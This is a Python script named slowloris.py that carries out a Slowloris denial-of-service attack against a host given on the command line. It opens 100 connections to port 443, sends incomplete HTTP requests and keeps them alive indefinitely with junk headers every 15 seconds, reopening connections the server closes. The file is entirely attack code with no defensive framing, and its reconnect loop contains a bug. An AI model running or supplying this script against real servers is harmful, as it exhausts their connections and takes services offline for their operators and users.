#/usr/bin/python

#slowloris.py

import random
import time
import socket
import sys

##set printLog variable to positive integer to print logs

printLog = 2

def log(text, lvl=1):
    if printLog >= lvl:
        print(text)

socketList = []

HTTPHeaders = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/41.0 Firefox/42.0",
    "Accept-language: en-US,en,q=0.8"
]

hostName = sys.argv[1]
#set variable socketCount to number of simultaneous HTTP connections to be opened.
socketCount = 100
log("Attacking {} with {} simultaneous connections.".format(hostName, socketCount))

#log("Creating total connections specified : {}".format(socketCount))
#log("opening ", socketCount)

for _ in range(socketCount):
    try:
        log("Connecting to {} connection number {}".format(hostName, _), lvl=2)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((hostName, 443)) #set port 80 or 443
    except socket.error:
        break
    socketList.append(s)

log("Setting up connections")
#making connections
for s in socketList:
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 20000)).encode("UTF-8"))
    for header in HTTPHeaders:
        s.send(bytes("{}\r\n".format(header).encode("UTF-8")))

while True:
    log("Keep alive headers")
    for s in socketList:
        try:
			#keeping connections alive by sending incomplete requests.
            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("UTF-8"))
        except socket.error:
            socketList.remove(s)
            try:
				#if connection is closed by server create a new connection.
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((hostName, 443)) #set port 80 or 443
                for s in socketList:
                    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 20000)).encode("UTF-8"))
                    for header in HTTPHeaders:
                        s.send(bytes("{}\r\n".format(header).encode("UTF-8")))
            except socket.error:
                continue

    time.sleep(15)
